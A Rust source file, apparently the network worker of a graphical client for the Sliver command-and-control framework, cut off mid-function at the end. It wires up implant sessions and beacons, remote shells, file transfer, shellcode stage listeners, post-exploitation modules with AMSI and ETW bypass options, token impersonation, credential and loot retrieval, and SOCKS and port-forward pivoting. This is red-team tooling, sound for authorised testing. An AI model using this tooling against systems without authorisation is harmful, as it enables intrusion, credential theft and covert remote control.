//! Async gRPC worker for the Sliver operator API.
//!
//! The UI thread never blocks on the network. It owns a [`SliverHandle`] whose
//! `commands` sender pushes [`Command`]s to a background Tokio runtime, and
//! whose `updates` receiver drains [`Update`]s each frame. The worker keeps a
//! live `Events` stream open and services on-demand RPCs concurrently.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use anyhow::Context as _;
use parking_lot::Mutex;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{mpsc::{self, UnboundedReceiver, UnboundedSender}, oneshot};
use tokio_rustls::TlsConnector;
use tokio_stream::wrappers::UnboundedReceiverStream;
use tonic::service::interceptor::InterceptedService;
use tonic::service::Interceptor;
use tonic::transport::{Channel, Endpoint, Uri};
use tonic::{Request, Status};

use crate::config::OperatorConfig;
use crate::proto::clientpb;
use crate::proto::commonpb;
use crate::proto::rpcpb::sliver_rpc_client::SliverRpcClient;
use crate::proto::sliverpb;

mod battery_admin;
mod battery_ext;
mod ops;
pub use ops::{BuildInfo, GrepHit, Op, OpUpdate, RegValue, ServerInfo};

type Rpc = SliverRpcClient<InterceptedService<Channel, AuthInterceptor>>;

/// Identifies the implant a command targets.
#[derive(Clone, Debug, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct Target {
    pub session_id: String,
    pub beacon_id: String,
}

impl Target {
    pub fn session(id: impl Into<String>) -> Self {
        Self { session_id: id.into(), beacon_id: String::new() }
    }
    pub fn beacon(id: impl Into<String>) -> Self {
        Self { session_id: String::new(), beacon_id: id.into() }
    }
    pub fn is_beacon(&self) -> bool {
        !self.beacon_id.is_empty()
    }
    pub fn key(&self) -> String {
        if self.is_beacon() {
            self.beacon_id.clone()
        } else {
            self.session_id.clone()
        }
    }
    fn request(&self, timeout_secs: i64) -> commonpb::Request {
        commonpb::Request {
            r#async: self.is_beacon(),
            timeout: timeout_secs * 1_000_000_000 - 1,
            beacon_id: self.beacon_id.clone(),
            session_id: self.session_id.clone(),
        }
    }
}

/// What kind of C2 listener to start.
#[derive(Clone, Debug)]
pub enum ListenerSpec {
    Mtls { host: String, port: u32 },
    /// `website` (optional) attaches a hosted-content website to the listener.
    Https { host: String, domain: String, port: u32, secure: bool, website: String, tls: ListenerTls },
    Dns { domains: Vec<String>, host: String, port: u32, canaries: bool },
    /// TCP stage listener: generate a Windows/amd64 shellcode stage (calling
    /// back to `c2`) and serve it on `bind_host:bind_port`.
    Stage { bind_host: String, bind_port: u32, c2: String },
    /// WireGuard listener: UDP `port`, in-tunnel comms `nport`, key exchange `key_port`.
    Wg { host: String, port: u32, nport: u32, key_port: u32 },
}

/// The certificate an HTTPS listener presents.
#[derive(Clone, Debug, Default, PartialEq)]
pub enum ListenerTls {
    /// Sliver generates a self-signed certificate.
    #[default]
    Auto,
    /// PEM certificate and private key files, read when the listener starts.
    Files { cert: String, key: String },
    /// Let's Encrypt for the listener's domain (needs public DNS and port 80).
    Acme,
}

/// A post-exploitation module invocation built by the Modules panel.
#[derive(Clone, Debug)]
pub enum ModuleSpec {
    ExecuteAssembly { data: Vec<u8>, args: Vec<String>, process: String, is_dll: bool, amsi_bypass: bool, etw_bypass: bool, class_name: String, method: String, arch: String },
    Sideload { data: Vec<u8>, args: String, entry_point: String, process: String, is_dll: bool },
    SpawnDll { data: Vec<u8>, args: String, entry_point: String, process: String },
    CallExtension { name: String, export: String, args: Vec<u8>, is_bof: bool, bof_data: Vec<u8> },
    RegisterExtension { name: String, data: Vec<u8>, os: String, init: String },
    Migrate { pid: u32, process: String },
    GetSystem { process: String },
    Impersonate { username: String },
    RevToSelf,
    MakeToken { username: String, password: String, domain: String, logon_type: u32 },
    GetPrivs,
    Ifconfig,
    Netstat,
    GetEnv,
    WhoAmI,
}

/// Commands the UI sends to the worker.
#[derive(Clone, Debug)]
pub enum Command {
    RefreshAll,
    Execute { target: Target, path: String, args: Vec<String> },
    Ls { target: Target, path: String },
    Download { target: Target, path: String, save_to: String },
    Upload { target: Target, remote: String, data: Vec<u8> },
    Rm { target: Target, path: String, recursive: bool },
    Mkdir { target: Target, path: String },
    Screenshot { target: Target },
    Ps { target: Target },
    StartListener(ListenerSpec),
    /// Edit a running listener: stop job `job_id`, start `spec` in its place.
    /// If that fails and `previous` is known, the original is started again.
    RestartListener { job_id: u32, spec: ListenerSpec, previous: Option<ListenerSpec> },
    KillJob(u32),
    KillSession(Target),
    Rename { target: Target, name: String },
    /// Build an implant. `save_dir: None` hands the bytes back to the UI
    /// (`Update::BuildReady`) so the operator picks where to save it.
    Generate { config: clientpb::ImplantConfig, name: String, save_dir: Option<String> },
    /// Build a *staged* payload: compile `config` as shellcode (the stage), host it on a
    /// stager listener, and report back (`Update::StagedReady`) so the UI can drive
    /// `generate stager` in the embedded Sliver Console to produce the stub.
    GenerateStaged {
        config: clientpb::ImplantConfig, name: String,
        bind_host: String, bind_port: u32, protocol: i32,
        server_lhost: String, stager_format: String, stager_arch: String, save_dir: String,
    },

    // Interactive shells over the tunnel data plane.
    OpenShell { target: Target, pty: bool, path: String, rows: u32, cols: u32 },
    ShellInput { tunnel_id: u64, session_id: String, data: Vec<u8> },
    ShellResize { target: Target, tunnel_id: u64, rows: u32, cols: u32 },
    CloseShell { tunnel_id: u64, session_id: String },

    // Post-ex modules.
    Module { target: Target, spec: ModuleSpec },
    ListExtensions { target: Target },

    // Beacons.
    RefreshBeaconTasks { beacon_id: String },
    BeaconTaskContent { beacon_id: String, task_id: String },
    CancelBeaconTask { beacon_id: String, task_id: String },
    RmBeacon { beacon_id: String },

    // Pivoting: SOCKS proxies and port-forwards.
    StartSocks { target: Target, bind: String },
    StartPortfwd { target: Target, bind: String, remote_host: String, remote_port: u32 },
    StartRportfwd { target: Target, bind_addr: String, bind_port: u32, fwd_addr: String, fwd_port: u32 },
    StopPivot { id: u32 },
    RefreshPivotsList,

    // Collections & topology.
    RefreshLoot,
    RefreshCreds,
    RefreshPivots,

    // Hosted files (Sliver "websites", served by HTTP(S) listeners).
    RefreshWebsites,
    HostFile { website: String, path: String, content_type: String, data: Vec<u8>, original_file: String },
    UnhostFile { website: String, path: String },
    RemoveWebsite { name: String },

    /// Extended operations (processes, builds, hosts, registry, …).
    Op(Op),
    /// Stop waiting for a tracked request (see `Update::Running`).
    Cancel { id: u64 },
    /// A line for this operator's client log on the server (`ClientLog` stream).
    ClientLog(String),

    Shutdown,
}

impl Command {
    /// One line for the operator activity log: the implant it acts on (None = the
    /// server) and what it does. None for UI plumbing (refreshes, shell keystrokes,
    /// resizes). Secrets are left out.
    pub fn describe(&self) -> Option<(Option<&Target>, String)> {
        let (t, s) = match self {
            Command::Execute { target, path, args } => (Some(target), format!("execute {path} {}", args.join(" ")).trim_end().to_string()),
            Command::Ls { target, path } => (Some(target), format!("ls {path}")),
            Command::Download { target, path, save_to } => (Some(target), format!("download {path} → {save_to}")),
            Command::Upload { target, remote, data } => (Some(target), format!("upload {remote} ({} bytes)", data.len())),
            Command::Rm { target, path, .. } => (Some(target), format!("rm {path}")),
            Command::Mkdir { target, path } => (Some(target), format!("mkdir {path}")),
            Command::Screenshot { target } => (Some(target), "screenshot".into()),
            Command::Ps { target } => (Some(target), "ps".into()),
            Command::KillSession(target) => (Some(target), "kill implant".into()),
            Command::Rename { target, name } => (Some(target), format!("rename → {name}")),
            Command::OpenShell { target, pty, .. } => (Some(target), format!("open {}shell", if *pty { "PTY " } else { "" })),
            Command::Module { target, spec } => (Some(target), module_label(spec)),
            Command::ListExtensions { target } => (Some(target), "list extensions".into()),
            Command::StartSocks { target, bind } => (Some(target), format!("SOCKS5 proxy on {bind}")),
            Command::StartPortfwd { target, bind, remote_host, remote_port } => (Some(target), format!("port-forward {bind} → {remote_host}:{remote_port}")),
            Command::StartRportfwd { target, bind_addr, bind_port, fwd_addr, fwd_port } => (Some(target), format!("reverse port-forward {bind_addr}:{bind_port} → {fwd_addr}:{fwd_port}")),
            Command::StartListener(spec) => (None, format!("start listener {}", listener_label(spec))),
            Command::RestartListener { job_id, spec, .. } => (None, format!("restart listener job {job_id} as {}", listener_label(spec))),
            Command::KillJob(id) => (None, format!("stop listener job {id}")),
            Command::Generate { name, config, .. } => (None, format!("build implant {} ({}/{}{})", if name.is_empty() { "(random name)" } else { name }, config.goos, config.goarch, if config.is_beacon { ", beacon" } else { "" })),
            Command::GenerateStaged { name, bind_port, .. } => (None, format!("build staged payload {name} (stage on :{bind_port})")),
            Command::RmBeacon { beacon_id } => (None, format!("remove beacon {}", short_id(beacon_id))),
            Command::CancelBeaconTask { beacon_id, task_id } => (None, format!("cancel task {} on beacon {}", short_id(task_id), short_id(beacon_id))),
            Command::StopPivot { id } => (None, format!("stop tunnel {id}")),
            Command::HostFile { website, path, data, .. } => (None, format!("host file {website}{path} ({} bytes)", data.len())),
            Command::UnhostFile { website, path } => (None, format!("stop hosting {website}{path}")),
            Command::RemoveWebsite { name } => (None, format!("remove website {name}")),
            Command::Op(op) => return op.describe(),
            _ => return None,
        };
        Some((t, s))
    }
}

/// Short form of a listener for logs.
fn listener_label(spec: &ListenerSpec) -> String {
    match spec {
        ListenerSpec::Mtls { host, port } => format!("mTLS {host}:{port}"),
        ListenerSpec::Https { host, port, secure, .. } => format!("{} {host}:{port}", if *secure { "HTTPS" } else { "HTTP" }),
        ListenerSpec::Dns { domains, port, .. } => format!("DNS {} :{port}", domains.join(",")),
        ListenerSpec::Stage { bind_host, bind_port, .. } => format!("TCP stage {bind_host}:{bind_port}"),
        ListenerSpec::Wg { host, port, .. } => format!("WireGuard {host}:{port}"),
    }
}

/// A decoded C2 event for the activity log / live tables.
#[derive(Clone, Debug)]
pub struct EventMsg {
    pub kind: String,
    pub text: String,
}

/// Updates the worker pushes back to the UI.
#[derive(Clone, Debug)]
pub enum Update {
    Connecting,
    Connected { version: String },
    ConnectError(String),
    Sessions(Vec<clientpb::Session>),
    Beacons(Vec<clientpb::Beacon>),
    Jobs(Vec<clientpb::Job>),
    Event(EventMsg),
    Output { target: String, title: String, body: String, ok: bool },
    FileListing { target: String, listing: sliverpb::Ls },
    Screenshot { target: String, png: Vec<u8> },
    GenerateDone { name: String, path: String, ok: bool, msg: String },
    /// A listener this client started, with the settings it was started with
    /// (Sliver's job list only reports protocol, port and domains).
    ListenerStarted { job_id: u32, spec: ListenerSpec },
    /// A finished build waiting for the operator to choose a save location.
    BuildReady { name: String, file_name: String, data: Vec<u8> },
    /// A staged payload's stage is compiled and hosted on a stager listener; the UI now
    /// runs `generate stager` in the Sliver Console to build the matching stub.
    StagedReady {
        job_id: u32, server_lhost: String, bind_port: u32, protocol: i32,
        stager_format: String, stager_arch: String, save_dir: String, stage_bytes: usize,
    },
    Notice { ok: bool, text: String },

    // Shells
    ShellOpened { target: String, tunnel_id: u64, pty: bool },
    ShellOutput { tunnel_id: u64, data: Vec<u8> },
    ShellClosed { tunnel_id: u64 },

    // Collections & topology
    Extensions { target: String, names: Vec<String> },
    Loot(Vec<clientpb::Loot>),
    Creds(Vec<clientpb::Credential>),
    Pivots(clientpb::PivotGraph),
    /// Websites with content metadata (content bytes stripped).
    Websites(Vec<clientpb::Website>),

    // Beacons
    BeaconTasks { beacon_id: String, tasks: Vec<clientpb::BeaconTask> },

    // Pivoting (SOCKS / port-forwards). The worker owns these; it pushes the
    // current list whenever it changes.
    PivotList(Vec<PivotInfo>),

    /// A request to a session is in flight; `Command::Cancel { id }` abandons it.
    Running { id: u64, target: String, label: String },
    /// A tracked request finished, or was cancelled.
    Finished { id: u64, target: String, label: String, cancelled: bool },

    /// Results of extended operations.
    Op(OpUpdate),
}

/// A client-managed pivot (SOCKS proxy or port-forward) for the Pivoting view.
#[derive(Clone, Debug)]
pub struct PivotInfo {
    pub id: u32,
    pub kind: String,   // "socks5" | "portfwd" | "rportfwd"
    pub bind: String,
    pub dest: String,
    pub session: String,
    pub conns: usize,
}

/// Handle held by the UI thread.
pub struct SliverHandle {
    pub commands: UnboundedSender<Command>,
    pub updates: crossbeam_channel::Receiver<Update>,
    _join: std::thread::JoinHandle<()>,
}

impl SliverHandle {
    pub fn send(&self, cmd: Command) {
        let _ = self.commands.send(cmd);
    }
}

/// Shared multiplexer for the single `TunnelData` bidirectional stream. All
/// interactive shells (and later port-forwards) ride this one stream, keyed by
/// tunnel id — mirroring the official client's design.
#[derive(Clone)]
struct TunnelHub {
    outbound: UnboundedSender<sliverpb::TunnelData>,
    bind_waiters: Arc<Mutex<HashMap<u64, oneshot::Sender<()>>>>,
    open: Arc<Mutex<std::collections::HashSet<u64>>>,
    /// Raw byte sinks for non-shell tunnels (port-forward connections). A
    /// tunnel with no sink here routes its data to the shell UI instead.
    sinks: Arc<Mutex<HashMap<u64, UnboundedSender<Vec<u8>>>>>,
}

impl TunnelHub {
    fn new() -> (Self, UnboundedReceiver<sliverpb::TunnelData>) {
        let (out_tx, out_rx) = mpsc::unbounded_channel::<sliverpb::TunnelData>();
        (
            Self {
                outbound: out_tx,
                bind_waiters: Arc::new(Mutex::new(HashMap::new())),
                open: Arc::new(Mutex::new(std::collections::HashSet::new())),
                sinks: Arc::new(Mutex::new(HashMap::new())),
            },
            out_rx,
        )
    }
    fn send(&self, frame: sliverpb::TunnelData) {
        let _ = self.outbound.send(frame);
    }
}

/// Lazily-initialised shared tunnel stream, created on the first shell.
type TunnelHandle = Arc<tokio::sync::Mutex<Option<TunnelHub>>>;

/// Shared multiplexer for the single `SocksProxy` bidi stream. Each SOCKS client
/// connection gets its own tunnel id (from CreateSocks) and a sink here.
#[derive(Clone)]
struct SocksHub {
    outbound: UnboundedSender<sliverpb::SocksData>,
    sinks: Arc<Mutex<HashMap<u64, UnboundedSender<sliverpb::SocksData>>>>,
}
impl SocksHub {
    fn new() -> (Self, UnboundedReceiver<sliverpb::SocksData>) {
        let (tx, rx) = mpsc::unbounded_channel::<sliverpb::SocksData>();
        (Self { outbound: tx, sinks: Arc::new(Mutex::new(HashMap::new())) }, rx)
    }
    fn send(&self, f: sliverpb::SocksData) { let _ = self.outbound.send(f); }
}
type SocksHandle = Arc<tokio::sync::Mutex<Option<SocksHub>>>;

/// A running client-managed pivot (SOCKS proxy or port-forward).
struct PivotEntry {
    id: u32,
    kind: &'static str,
    bind: String,
    dest: String,
    session: String,
    conns: Arc<std::sync::atomic::AtomicUsize>,
    abort: tokio::task::AbortHandle,
    rportfwd_id: Option<u32>,
}
#[derive(Default)]
struct PivotRegistry { next_id: u32, items: Vec<PivotEntry> }
type Pivots = Arc<tokio::sync::Mutex<PivotRegistry>>;

/// Snapshot the registry and push it to the UI.
async fn push_pivots(pivots: &Pivots, upd_tx: &crossbeam_channel::Sender<Update>, ctx: &egui::Context) {
    use std::sync::atomic::Ordering::Relaxed;
    let reg = pivots.lock().await;
    let list: Vec<PivotInfo> = reg.items.iter().map(|e| PivotInfo {
        id: e.id, kind: e.kind.into(), bind: e.bind.clone(), dest: e.dest.clone(),
        session: e.session.clone(), conns: e.conns.load(Relaxed),
    }).collect();
    let _ = upd_tx.send(Update::PivotList(list));
    ctx.request_repaint();
}

/// Bearer-token interceptor applied to every RPC.
#[derive(Clone)]
pub struct AuthInterceptor {
    token: String,
}

impl Interceptor for AuthInterceptor {
    fn call(&mut self, mut req: Request<()>) -> Result<Request<()>, Status> {
        if !self.token.is_empty() {
            let value = format!("Bearer {}", self.token)
                .parse()
                .map_err(|_| Status::internal("invalid auth token"))?;
            req.metadata_mut().insert("authorization", value);
        }
        Ok(req)
    }
}

/// Spawn the background worker and return a handle.
pub fn connect(cfg: OperatorConfig, ctx: egui::Context) -> SliverHandle {
    let (cmd_tx, cmd_rx) = mpsc::unbounded_channel::<Command>();
    let (upd_tx, upd_rx) = crossbeam_channel::unbounded::<Update>();

    let join = std::thread::Builder::new()
        .name("sliver-grpc".into())
        .spawn(move || {
            let rt = match tokio::runtime::Builder::new_multi_thread()
                .worker_threads(2)
                .enable_all()
                .build()
            {
                Ok(rt) => rt,
                Err(e) => {
                    let _ = upd_tx.send(Update::ConnectError(format!("runtime: {e}")));
                    ctx.request_repaint();
                    return;
                }
            };
            rt.block_on(worker_main(cfg, ctx, cmd_rx, upd_tx));
        })
        .expect("spawn worker thread");

    SliverHandle { commands: cmd_tx, updates: upd_rx, _join: join }
}

async fn worker_main(
    cfg: OperatorConfig,
    ctx: egui::Context,
    mut cmd_rx: UnboundedReceiver<Command>,
    upd_tx: crossbeam_channel::Sender<Update>,
) {
    macro_rules! push {
        ($u:expr) => {{
            let _ = upd_tx.send($u);
            ctx.request_repaint();
        }};
    }

    push!(Update::Connecting);

    let rpc = match establish(&cfg).await {
        Ok(rpc) => rpc,
        Err(e) => {
            push!(Update::ConnectError(format!("{e:#}")));
            return;
        }
    };

    // Confirm the connection with a version probe.
    {
        let mut c = rpc.clone();
        match c.get_version(commonpb::Empty {}).await {
            Ok(resp) => {
                let v = resp.into_inner();
                push!(Update::Connected {
                    version: format!("v{}.{}.{}", v.major, v.minor, v.patch),
                });
            }
            Err(e) => {
                push!(Update::ConnectError(format!("get_version: {}", e.message())));
                return;
            }
        }
    }

    // Live event stream.
    spawn_event_stream(rpc.clone(), ctx.clone(), upd_tx.clone());

    // Multiplexed tunnel data plane for interactive shells. Opened lazily on the
    // first shell: grpc-go withholds response headers until it sees a client
    // frame, so the stream must be primed with a tunnel bind frame — which means
    // we cannot open it until a tunnel exists.
    let hub: TunnelHandle = Arc::new(tokio::sync::Mutex::new(None));
    let socks: SocksHandle = Arc::new(tokio::sync::Mutex::new(None));
    let pivots: Pivots = Arc::new(tokio::sync::Mutex::new(PivotRegistry::default()));

    // Periodic refresh so tables stay current even without events.
    let mut refresh = tokio::time::interval(Duration::from_secs(3));
    refresh.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    // Client log stream to the server, opened on the first line and reopened if it drops.
    let mut client_log: Option<UnboundedSender<clientpb::ClientLogData>> = None;

    loop {
        tokio::select! {
            _ = refresh.tick() => {
                refresh_all(rpc.clone(), &upd_tx, &ctx).await;
            }
            maybe_cmd = cmd_rx.recv() => {
                let Some(cmd) = maybe_cmd else { break };
                if matches!(cmd, Command::Shutdown) {
                    break;
                }
                if let Command::ClientLog(line) = cmd {
                    let data = clientpb::ClientLogData { stream: "sliver-gui".into(), data: format!("{line}\n").into_bytes() };
                    let data = match &client_log {
                        Some(tx) => match tx.send(data) { Ok(()) => continue, Err(e) => e.0 },
                        None => data,
                    };
                    let (tx, rx) = mpsc::unbounded_channel();
                    let _ = tx.send(data);
                    let mut c = rpc.clone();
                    tokio::spawn(async move { let _ = c.client_log(UnboundedReceiverStream::new(rx)).await; });
                    client_log = Some(tx);
                    continue;
                }
                handle_command(cmd, rpc.clone(), ctx.clone(), upd_tx.clone(), hub.clone(), socks.clone(), pivots.clone());
            }
        }
    }
}

/// Open the shared `TunnelData` bidi stream and spawn its reader. The caller
/// must have already buffered a priming frame into `out_rx` (the first tunnel's
/// bind frame) so the server emits response headers and the open returns.
async fn open_tunnel_stream(
    rpc: Rpc,
    ctx: egui::Context,
    upd_tx: crossbeam_channel::Sender<Update>,
    hub: TunnelHub,
    out_rx: UnboundedReceiver<sliverpb::TunnelData>,
) -> bool {
    let req_stream = UnboundedReceiverStream::new(out_rx);
    let mut c = rpc;
    let resp = match tokio::time::timeout(Duration::from_secs(10), c.tunnel_data(req_stream)).await {
        Ok(Ok(r)) => r,
        Ok(Err(e)) => {
            let _ = upd_tx.send(Update::Event(EventMsg { kind: "error".into(), text: format!("tunnel stream unavailable: {}", e.message()) }));
            return false;
        }
        Err(_) => {
            let _ = upd_tx.send(Update::Event(EventMsg { kind: "error".into(), text: "tunnel stream open timed out".into() }));
            return false;
        }
    };

    // Reader: route incoming frames to the right shell tab.
    let hub_r = hub;
    tokio::spawn(async move {
        let mut stream = resp.into_inner();
        loop {
            match stream.message().await {
                Ok(Some(frame)) => {
                    let tid = frame.tunnel_id;
                    if frame.closed {
                        hub_r.open.lock().remove(&tid);
                        // Raw (port-forward) sink? drop it to close the local conn.
                        if hub_r.sinks.lock().remove(&tid).is_some() {
                            // sender dropped → conn writer task sees EOF
                        } else {
                            let _ = upd_tx.send(Update::ShellClosed { tunnel_id: tid });
                            ctx.request_repaint();
                        }
                    } else if frame.data.is_empty() {
                        // Bind acknowledgement for a freshly created tunnel.
                        if let Some(tx) = hub_r.bind_waiters.lock().remove(&tid) {
                            let _ = tx.send(());
                        }
                    } else if let Some(sink) = hub_r.sinks.lock().get(&tid).cloned() {
                        // Port-forward tunnel: pipe bytes to the local connection.
                        let _ = sink.send(frame.data);
                    } else {
                        let _ = upd_tx.send(Update::ShellOutput { tunnel_id: tid, data: frame.data });
                        ctx.request_repaint();
                    }
                }
                Ok(None) => break,
                Err(_) => break,
            }
        }
    });

    true
}

/// Build the mTLS channel and token-authenticated client.
async fn establish(cfg: &OperatorConfig) -> anyhow::Result<Rpc> {
    let tls = crate::tls::build_client_config(cfg)?;
    let connector = TlsConnector::from(tls);
    let server_name = crate::tls::server_name_for(&cfg.lhost);
    let host = cfg.lhost.clone();
    let port = cfg.lport;

    // tonic drives HTTP/2 over the stream we hand it; scheme is http because we
    // perform TLS ourselves inside the connector.
    let uri: Uri = format!("http://{host}:{port}")
        .parse()
        .context("invalid endpoint uri")?;
    let endpoint = Endpoint::from(uri)
        .http2_keep_alive_interval(Duration::from_secs(30))
        .keep_alive_timeout(Duration::from_secs(20))
        .tcp_nodelay(true)
        .connect_timeout(Duration::from_secs(10));

    let channel = endpoint
        .connect_with_connector(tower::service_fn(move |_: Uri| {
            let connector = connector.clone();
            let server_name = server_name.clone();
            let addr = format!("{host}:{port}");
            async move {
                let tcp = TcpStream::connect(&addr).await?;
                let tls = connector.connect(server_name, tcp).await?;
                Ok::<_, std::io::Error>(hyper_util::rt::TokioIo::new(tls))
            }
        }))
        .await
        .context("mTLS connection failed")?;

    let interceptor = AuthInterceptor { token: cfg.token.clone() };
    Ok(SliverRpcClient::with_interceptor(channel, interceptor)
        .max_decoding_message_size(2 * 1024 * 1024 * 1024 - 1)
        .max_encoding_message_size(2 * 1024 * 1024 * 1024 - 1))
}

fn spawn_event_stream(
    rpc: Rpc,
    ctx: egui::Context,
    upd_tx: crossbeam_channel::Sender<Update>,
) {
    tokio::spawn(async move {
        let mut c = rpc;
        let stream = match c.events(commonpb::Empty {}).await {
            Ok(s) => s.into_inner(),
            Err(e) => {
                let _ = upd_tx.send(Update::Event(EventMsg {
                    kind: "error".into(),
                    text: format!("event stream unavailable: {}", e.message()),
                }));
                ctx.request_repaint();
                return;
            }
        };
        let mut stream = stream;
        loop {
            match stream.message().await {
                Ok(Some(ev)) => {
                    if let Some(msg) = summarize_event(&ev) {
                        let _ = upd_tx.send(Update::Event(msg));
                        ctx.request_repaint();
                    }
                }
                Ok(None) => break,
                Err(e) => {
                    let _ = upd_tx.send(Update::Event(EventMsg {
                        kind: "error".into(),
                        text: format!("event stream closed: {}", e.message()),
                    }));
                    ctx.request_repaint();
                    break;
                }
            }
        }
    });
}

fn summarize_event(ev: &clientpb::Event) -> Option<EventMsg> {
    let kind = ev.event_type.clone();
    let text = match kind.as_str() {
        "session-connected" | "session-disconnected" | "session-updated" => {
            if let Some(s) = &ev.session {
                let short = s.id.split('-').next().unwrap_or(&s.id);
                let verb = match kind.as_str() {
                    "session-connected" => "session opened",
                    "session-disconnected" => "session lost",
                    _ => "session updated",
                };
                format!("{verb}: {short} {} ({}) {}/{} @ {}", s.name, s.hostname, s.os, s.arch, s.remote_address)
            } else {
                kind.clone()
            }
        }
        "beacon-registered" => {
            if let Some(s) = &ev.session {
                format!("beacon registered: {} ({})", s.name, s.hostname)
            } else {
                "beacon registered".into()
            }
        }
        "job-started" | "job-stopped" => {
            if let Some(j) = &ev.job {
                format!("{kind}: [{}] {} {}/{}", j.id, j.name, j.protocol, j.port)
            } else {
                kind.clone()
            }
        }
        "client-joined" | "client-left" => {
            if let Some(c) = &ev.client {
                format!("{kind}: {}", c.name)
            } else {
                kind.clone()
            }
        }
        "canary" => "⚠ DNS canary triggered".into(),
        "watchtower" => "⚠ implant detected on threat-intel platform".into(),
        _ if !ev.err.is_empty() => format!("{kind}: {}", ev.err),
        _ => return Some(EventMsg { kind, text: ev.err.clone() }),
    };
    Some(EventMsg { kind, text })
}

async fn refresh_all(
    rpc: Rpc,
    upd_tx: &crossbeam_channel::Sender<Update>,
    ctx: &egui::Context,
) {
    let mut c = rpc;
    if let Ok(r) = c.get_sessions(commonpb::Empty {}).await {
        let _ = upd_tx.send(Update::Sessions(r.into_inner().sessions));
    }
    if let Ok(r) = c.get_beacons(commonpb::Empty {}).await {
        let _ = upd_tx.send(Update::Beacons(r.into_inner().beacons));
    }
    if let Ok(r) = c.get_jobs(commonpb::Empty {}).await {
        let _ = upd_tx.send(Update::Jobs(r.into_inner().active));
    }
    if let Ok(r) = c.get_operators(commonpb::Empty {}).await {
        let _ = upd_tx.send(Update::Op(OpUpdate::Operators(r.into_inner().operators)));
    }
    if let Ok(r) = c.pivot_graph(commonpb::Empty {}).await {
        let _ = upd_tx.send(Update::Pivots(r.into_inner()));
    }
    ctx.request_repaint();
}

#[allow(clippy::too_many_arguments)]
fn handle_command(
    cmd: Command,
    rpc: Rpc,
    ctx: egui::Context,
    upd_tx: crossbeam_channel::Sender<Update>,
    hub: TunnelHandle,
    socks: SocksHandle,
    pivots: Pivots,
) {
    if let Command::Cancel { id } = cmd {
        // The watcher below reports it as cancelled once the task is gone.
        if let Some(h) = RUNNING.lock().remove(&id) { h.abort(); }
        return;
    }
    let tracked = tracked_label(&cmd);
    let (watch_tx, watch_ctx) = (upd_tx.clone(), ctx.clone());
    let task = tokio::spawn(async move {
        let mut c = rpc;
        macro_rules! push {
            ($u:expr) => {{
                let _ = upd_tx.send($u);
                ctx.request_repaint();
            }};
        }
        match cmd {
            Command::RefreshAll => refresh_all(c, &upd_tx, &ctx).await,
            Command::OpenShell { target, pty, path, rows, cols } => {
                open_shell(&mut c, hub, ctx.clone(), target, pty, path, rows, cols, &upd_tx).await;
            }
            Command::ShellInput { tunnel_id, session_id, data } => {
                if let Some(hub) = &*hub.lock().await {
                    hub.send(sliverpb::TunnelData { tunnel_id, session_id, data, ..Default::default() });
                }
            }
            Command::ShellResize { target, tunnel_id, rows, cols } => {
                let _ = c.shell_resize(sliverpb::ShellResizeReq {
                    rows, cols, tunnel_id, request: Some(target.request(10)),
                }).await;
            }
            Command::CloseShell { tunnel_id, session_id } => {
                if let Some(hub) = &*hub.lock().await {
                    hub.send(sliverpb::TunnelData { tunnel_id, session_id: session_id.clone(), closed: true, ..Default::default() });
                    hub.open.lock().remove(&tunnel_id);
                }
                let _ = c.close_tunnel(sliverpb::Tunnel { tunnel_id, session_id, ..Default::default() }).await;
            }
            Command::Op(op) => ops::run(op, &mut c, &upd_tx, &ctx).await,
            Command::Module { target, spec } => run_module(&mut c, target, spec, &upd_tx, &ctx).await,
            Command::ListExtensions { target } => {
                let req = sliverpb::ListExtensionsReq { request: Some(target.request(30)) };
                match c.list_extensions(req).await {
                    Ok(r) => push!(Update::Extensions { target: target.key(), names: r.into_inner().names }),
                    Err(e) => {
                        // Report an empty set so the panel renders, and note why.
                        push!(Update::Extensions { target: target.key(), names: Vec::new() });
                        push!(Update::Notice { ok: false, text: format!("list loaded extensions: {}", e.message()) });
                    }
                }
            }
            Command::Download { target, path, save_to } => {
                let req = sliverpb::DownloadReq { path: path.clone(), request: Some(target.request(120)), ..Default::default() };
                match c.download(req).await {
                    Ok(r) => {
                        let d = r.into_inner();
                        let bytes = if d.encoder == "gzip" { gunzip(&d.data) } else { d.data };
                        match std::fs::write(&save_to, &bytes) {
                            Ok(_) => push!(Update::Notice { ok: true, text: format!("downloaded {path} → {save_to} ({} bytes)", bytes.len()) }),
                            Err(e) => push!(Update::Notice { ok: false, text: format!("save failed: {e}") }),
                        }
                    }
                    Err(e) => push!(Update::Notice { ok: false, text: e.message().into() }),
                }
            }
            Command::Upload { target, remote, data } => {
                let req = sliverpb::UploadReq { path: remote.clone(), data, request: Some(target.request(120)), ..Default::default() };
                match c.upload(req).await {
                    Ok(_) => push!(Update::Notice { ok: true, text: format!("uploaded → {remote}") }),
                    Err(e) => push!(Update::Notice { ok: false, text: e.message().into() }),
                }
            }
            Command::Rm { target, path, recursive } => {
                let req = sliverpb::RmReq { path: path.clone(), recursive, force: true, request: Some(target.request(30)) };
                match c.rm(req).await {
                    Ok(_) => push!(Update::Notice { ok: true, text: format!("removed {path}") }),
                    Err(e) => push!(Update::Notice { ok: false, text: e.message().into() }),
                }
            }
            Command::Mkdir { target, path } => {
                let req = sliverpb::MkdirReq { path: path.clone(), request: Some(target.request(30)) };
                match c.mkdir(req).await {
                    Ok(_) => push!(Update::Notice { ok: true, text: format!("created {path}") }),
                    Err(e) => push!(Update::Notice { ok: false, text: e.message().into() }),
                }
            }
            Command::RefreshLoot => {
                if let Ok(r) = c.loot_all(commonpb::Empty {}).await {
                    push!(Update::Loot(r.into_inner().loot));
                }
            }
            Command::RefreshCreds => {
                if let Ok(r) = c.creds(commonpb::Empty {}).await {
                    push!(Update::Creds(r.into_inner().credentials));
                }
            }
            Command::RefreshPivots => {
                if let Ok(r) = c.pivot_graph(commonpb::Empty {}).await {
                    push!(Update::Pivots(r.into_inner()));
                }
            }

            // ---- Hosted files ----
            Command::RefreshWebsites => match list_websites(&mut c).await {
                Ok(sites) => push!(Update::Websites(sites)),
                Err(e) => push!(Update::Notice { ok: false, text: format!("websites: {}", e.message()) }),
            },
            Command::HostFile { website, path, content_type, data, original_file } => {
                let path = if path.starts_with('/') { path } else { format!("/{path}") };
                let content = clientpb::WebContent {
                    path: path.clone(),
                    content_type,
